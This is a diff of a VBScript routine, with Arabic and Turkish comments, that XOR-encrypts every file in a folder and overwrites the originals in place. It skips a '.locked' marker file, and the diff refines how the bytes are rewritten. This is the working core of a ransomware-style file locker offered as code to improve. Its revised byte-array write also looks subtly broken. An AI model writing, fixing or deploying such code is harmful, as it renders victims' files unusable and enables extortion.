@@ -1,35 +1,32 @@
 Sub ProcessFiles()
+    Dim inputStream, outputStream, b, i, binaryData
     Set folder = fso.GetFolder(folderPath)
+    
     For Each file In folder.Files
         If file.Name <> ".locked" Then
-            Dim inputStream, outputStream
             Set inputStream = CreateObject("ADODB.Stream")
-            Set outputStream = CreateObject("ADODB.Stream")
-            
-            ' قراءة الملف / Dosyayı oku
-            inputStream.Type = 1 ' Binary
+            inputStream.Type = 1 ' TypeBinary
             inputStream.Open
             inputStream.LoadFromFile file.Path
-            
-            ' معالجة البيانات / Veriyi işle
-            outputStream.Type = 1 ' Binary
-            outputStream.Open
-            
-            Dim b
-            While Not inputStream.EOS
-                b = AscB(inputStream.Read(1))
-                ' كتابة البايت بعد تعديله بـ XOR / XOR ile modifiye edilmiş byte'ı yaz
-                Dim resultByte(0)
-                resultByte(0) = b Xor key
-                outputStream.Write resultByte
-            Wend
-            
-            ' حفظ الملف / Dosyayı kaydet
-            outputStream.SaveToFile file.Path, 2 ' Overwrite
-            
+            binaryData = inputStream.Read
             inputStream.Close
-            outputStream.Close
             Set inputStream = Nothing
+
+            ' XOR logic with byte array / XOR mantığı ve bayt dizisi
+            Dim byteArr()
+            ReDim byteArr(LenB(binaryData) - 1)
+            For i = 0 To LenB(binaryData) - 1
+                ' AscB and ChrB are key here for binary / İkilik işlemler için AscB ve ChrB kritik
+                byteArr(i) = AscB(MidB(binaryData, i + 1, 1)) Xor key
+            Next
+
+            ' Write using Stream.Write with a proper byte array / Stream.Write ile yazma
+            Set outputStream = CreateObject("ADODB.Stream")
+            outputStream.Type = 1 ' TypeBinary
+            outputStream.Open
+            outputStream.Write byteArr
+            outputStream.SaveToFile file.Path, 2 ' adSaveCreateOverWrite
+            outputStream.Close
             Set outputStream = Nothing
         End If
     Next
